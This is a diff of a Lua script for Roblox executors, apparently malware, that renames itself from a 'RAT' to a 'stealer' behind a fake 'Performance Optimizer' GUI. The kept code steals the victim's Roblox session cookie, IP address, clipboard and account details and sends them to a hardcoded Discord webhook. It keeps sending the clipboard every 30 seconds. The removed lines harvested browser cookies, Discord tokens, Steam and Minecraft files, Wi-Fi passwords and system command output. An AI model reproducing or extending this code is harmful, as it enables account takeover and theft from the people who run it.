@@ -1,5 +1,5 @@
 -- ============================================================
--- ULTIMATE UNIVERSAL RAT – PC + Mobile, All Executors
+-- DELTA-OPTIMIZED STEALER + LEGIT GUI
 -- ============================================================
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
@@ -34,7 +34,7 @@ local function getClip()
     return "N/A"
 end
 
--- ========== IP & GEOLOCATION ==========
+-- ========== IP ==========
 local function getIP()
     local ip = "N/A"
     for _, url in ipairs({"https://api.ipify.org", "https://ip-api.com/json/?fields=query", "https://icanhazip.com", "https://httpbin.org/ip"}) do
@@ -49,26 +49,7 @@ local function getIP()
     return ip
 end
 
-local function getGeo()
-    local geo = {}
-    local ok, res = pcall(function() return game:GetService("HttpService"):GetAsync("http://ip-api.com/json/") end)
-    if ok and res then
-        local data = game:GetService("HttpService"):JSONDecode(res)
-        geo.country = data.country or "N/A"
-        geo.city = data.city or "N/A"
-        geo.isp = data.isp or "N/A"
-        geo.org = data.org or "N/A"
-        geo.as = data.as or "N/A"
-        geo.timezone = data.timezone or "N/A"
-        geo.lat = data.lat or "N/A"
-        geo.lon = data.lon or "N/A"
-    else
-        geo.country = "N/A"; geo.city = "N/A"; geo.isp = "N/A"; geo.org = "N/A"; geo.as = "N/A"; geo.timezone = "N/A"; geo.lat = "N/A"; geo.lon = "N/A"
-    end
-    return geo
-end
-
--- ========== COOKIE (all known methods) ==========
+-- ========== COOKIE (safe attempts) ==========
 local function stealCookie()
     local ok, val = pcall(getcookie, "https://www.roblox.com/")
     if ok and val and val ~= "" then return val end
@@ -76,166 +57,11 @@ local function stealCookie()
     if ok and val and val ~= "" then return val end
     ok, val = pcall(function() return syn and syn.cookie and syn.cookie() end)
     if ok and val and val ~= "" then return val end
-    ok, val = pcall(function()
-        local res = request({Url = "https://www.roblox.com/", Method = "GET"})
-        if res and res.Headers then
-            for k, v in pairs(res.Headers) do
-                if string.lower(k) == "set-cookie" then
-                    return v:match("(.-);") or v
-                end
-            end
-        end
-        return nil
-    end)
-    if ok and val and val ~= "" then return val end
-    ok, val = pcall(function()
-        local page = game:GetService("HttpService"):GetAsync("https://www.roblox.com/")
-        if page and page:match("__RequestVerificationToken") then
-            return page:match('__RequestVerificationToken" value="(.-)"')
-        end
-        return nil
-    end)
-    if ok and val and val ~= "" then return val end
-    ok, val = pcall(function()
-        if not getgc then return nil end
-        local gc = getgc(true)
-        for _, v in ipairs(gc) do
-            if type(v) == "string" and v:match("_.%w+%.ROBLOSECURITY") then
-                return v
-            end
-        end
-        return nil
-    end)
-    if ok and val and val ~= "" then return val end
-    ok, val = pcall(function()
-        if not getrawmetatable then return nil end
-        local mt = getrawmetatable(game)
-        if mt and mt.__index then
-            local old = mt.__index
-            for i = 1, 100 do
-                local res = old(game, "HttpService", i)
-                if type(res) == "table" and res.Cookies then
-                    return res.Cookies
-                end
-            end
-        end
-        return nil
-    end)
-    ok, val = pcall(getclipboard)
-    if ok and val and val:match("_.%w+%.ROBLOSECURITY") then return val end
     return "Not available (executor limit)"
 end
 
--- ========== SYSTEM INFO (optional, will fail gracefully) ==========
-local function executeCommand(cmd)
-    if not io or not io.popen then return nil end
-    local handle, err = io.popen(cmd)
-    if not handle then return nil end
-    local result = handle:read("*a")
-    handle:close()
-    return result
-end
-
-local function readFile(path, limit)
-    limit = limit or 500
-    if not io or not io.open then return nil end
-    local f, err = io.open(path, "rb")
-    if not f then return nil end
-    local content = f:read(limit)
-    f:close()
-    return content
-end
-
-local function getBrowserProfiles()
-    local profiles = {}
-    local appData = pcall(os.getenv, "APPDATA") and os.getenv("APPDATA") or ""
-    local localAppData = pcall(os.getenv, "LOCALAPPDATA") and os.getenv("LOCALAPPDATA") or ""
-    local userProfile = pcall(os.getenv, "USERPROFILE") and os.getenv("USERPROFILE") or ""
-
-    if localAppData and localAppData ~= "" then
-        local chromePath = localAppData .. "\\Google\\Chrome\\User Data\\Default\\"
-        local ck = readFile(chromePath .. "Cookies", 500)
-        if ck then profiles["Chrome Cookies (first 500)"] = ck end
-        local edgePath = localAppData .. "\\Microsoft\\Edge\\User Data\\Default\\"
-        local ek = readFile(edgePath .. "Cookies", 500)
-        if ek then profiles["Edge Cookies (first 500)"] = ek end
-    end
-    if appData and appData ~= "" then
-        local discordPath = appData .. "\\discord\\Local Storage\\leveldb\\"
-        local discordFiles = executeCommand("dir \"" .. discordPath .. "\" /b")
-        if discordFiles and not discordFiles:find("Cannot") then
-            for file in discordFiles:gmatch("[^\r\n]+") do
-                if file:match("%.log$") then
-                    local content = readFile(discordPath .. file, 2000)
-                    if content then
-                        local token = content:match("[%w_%-]+%.[%w_%-]+%.[%w_%-]+")
-                        if token then
-                            profiles["Discord Token"] = token
-                            break
-                        end
-                    end
-                end
-            end
-        end
-        local steamPath = userProfile .. "\\AppData\\Local\\Steam\\config\\config.vdf"
-        local steamCfg = readFile(steamPath, 500)
-        if steamCfg then profiles["Steam Config (first 500)"] = steamCfg end
-        local mcPath = appData .. "\\.minecraft\\launcher_profiles.json"
-        local mcCfg = readFile(mcPath, 500)
-        if mcCfg then profiles["Minecraft Profiles (first 500)"] = mcCfg end
-        -- Wi-Fi passwords (may require admin)
-        local wifiProfiles = executeCommand("netsh wlan show profiles")
-        if wifiProfiles and not wifiProfiles:find("unavailable") then
-            for name in wifiProfiles:gmatch("All User Profile%s*:%s*(.-)\r?\n") do
-                local key = executeCommand('netsh wlan show profile name="' .. name .. '" key=clear')
-                if key then
-                    local password = key:match("Key Content%s*:%s*(.-)\r?\n")
-                    if password and password ~= "" then
-                        profiles["Wi‑Fi Password for " .. name] = password
-                    end
-                end
-            end
-        end
-    end
-    return profiles
-end
-
-local function getSystemCommands()
-    local info = {}
-    if os.execute then
-        info.tasklist = executeCommand("tasklist /v /fo csv") or "N/A"
-        info.netstat = executeCommand("netstat -ano") or "N/A"
-        info.ipconfig = executeCommand("ipconfig /all") or "N/A"
-        info.systeminfo = executeCommand("systeminfo") or "N/A"
-        info.wmic_cpu = executeCommand("wmic cpu get name,numberofcores,numberoflogicalprocessors /format:csv") or "N/A"
-        info.wmic_disk = executeCommand("wmic diskdrive get model,size /format:csv") or "N/A"
-    end
-    return info
-end
-
--- ========== SCREENSHOT / WEBCAM (if supported) ==========
-local function captureScreen()
-    if pcall(function() return screenshot end) then
-        local ok, img = pcall(screenshot)
-        if ok and img then return "Screenshot captured (" .. tostring(#img) .. " bytes)" end
-    end
-    if pcall(function() return capture end) then
-        local ok, img = pcall(capture)
-        if ok and img then return "Capture captured (" .. tostring(#img) .. " bytes)" end
-    end
-    return "No screenshot function available"
-end
-
-local function getWebcam()
-    if pcall(function() return webcam end) then
-        local ok, frame = pcall(webcam)
-        if ok and frame then return "Webcam frame (" .. tostring(#frame) .. " bytes)" end
-    end
-    return "No webcam function available"
-end
-
--- ========== COLLECT ALL DATA ==========
-local function collectAll()
+-- ========== COLLECT DATA ==========
+local function collectData()
     local info = {}
     info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Unknown"
     local player = game.Players.LocalPlayer
@@ -246,6 +72,7 @@ local function collectAll()
         info.accountAge = tostring(math.floor((player.UserId / 100000000) * 2) + 2006) .. " (approx)"
         info.friendsOnline = tostring(#player:GetFriendsOnline() or 0)
         info.totalFriends = tostring(#player:GetFriends() or 0)
+        -- Groups
         local groups = {}
         local ok, grpData = pcall(function() return player:GetGroups() end)
         if ok and grpData then
@@ -290,14 +117,7 @@ local function collectAll()
                 if next(stats) then info.leaderstats = game:GetService("HttpService"):JSONEncode(stats) end
             end
         end)
-        local robuxUrl = "https://economy.roblox.com/v1/users/" .. player.UserId .. "/currency"
-        local ok, res = pcall(function() return game:GetService("HttpService"):GetAsync(robuxUrl) end)
-        if ok and res then
-            local rb = res:match('"robux":(%d+)')
-            info.robux = rb or "N/A"
-        end
     end
-
     info.placeId = tostring(safeGet(game, "PlaceId", "N/A"))
     info.jobId = safeGet(game, "JobId", "N/A")
     info.gameName = safeGet(game, "Name", "Unknown")
@@ -307,26 +127,9 @@ local function collectAll()
     info.maxPlayers = tostring(safeGet(game, "MaxPlayers", "N/A"))
     info.serverTime = tostring(safeGet(game, "ServerTime", "N/A"))
     info.clientVersion = safeGet(game, "Version", "N/A")
-
     info.ip = getIP()
-    local geo = getGeo()
-    for k, v in pairs(geo) do info["geo_" .. k] = v end
     info.cookie = stealCookie()
     info.clipboard = getClip()
-    info.screenshot = captureScreen()
-    info.webcam = getWebcam()
-
-    local browserData = getBrowserProfiles()
-    for k, v in pairs(browserData) do info["browser_" .. k] = v end
-
-    local sysCmd = getSystemCommands()
-    for k, v in pairs(sysCmd) do info["cmd_" .. k] = v end
-
-    for _, var in ipairs({"OS", "COMPUTERNAME", "USERNAME", "PROCESSOR_IDENTIFIER", "NUMBER_OF_PROCESSORS", "APPDATA", "LOCALAPPDATA", "USERPROFILE"}) do
-        local ok, val = pcall(function() return os.getenv(var) end)
-        if ok and val then info["env_" .. var] = val end
-    end
-
     pcall(function()
         local stats = game:GetService("Stats")
         info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
@@ -336,13 +139,12 @@ local function collectAll()
         local ft = run.RenderStepTime
         if ft and ft > 0 then info.fps = tostring(math.floor(1 / ft)) end
     end)
-
     return info
 end
 
 -- ========== SEND DATA ==========
 local function sendData()
-    local data = collectAll()
+    local data = collectData()
     local lines = {}
     for k, v in pairs(data) do
         if v and v ~= "" then
@@ -353,7 +155,7 @@ local function sendData()
     send(webhook, msg)
 end
 
--- ========== LEGIT GUI (Performance Optimizer) ==========
+-- ========== GUI ==========
 local function createGUI()
     pcall(function()
         local pg = game.Players.LocalPlayer:WaitForChild("PlayerGui")
@@ -452,32 +254,14 @@ local function createGUI()
     end)
 end
 
--- ========== MAIN LOOP (send initial data + periodic updates) ==========
-local function main()
-    sendData() -- initial full dump
-    createGUI()
-    while true do
-        task.wait(30)
-        local update = {}
-        update.clipboard = getClip()
-        update.screenshot = captureScreen()
-        update.webcam = getWebcam()
-        update.ping = (function()
-            local ok, v = pcall(function() return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString() end)
-            return ok and v or "N/A"
-        end)()
-        local lines = {}
-        for k, v in pairs(update) do
-            if v and v ~= "" then
-                table.insert(lines, string.format("%s: %s", k, tostring(v)))
-            end
-        end
-        if #lines > 0 then
-            local msg = "```\n[UPDATE]\n" .. table.concat(lines, "\n") .. "\n```"
-            send(webhook, msg)
-        end
+-- ========== MAIN ==========
+sendData()
+createGUI()
+-- Keep sending clipboard updates every 30 seconds (optional)
+while true do
+    task.wait(30)
+    local clip = getClip()
+    if clip and clip ~= "N/A" and clip ~= "" then
+        send(webhook, "```[CLIPBOARD] " .. clip .. "```")
     end
 end
-
--- ========== START ==========
-pcall(main)
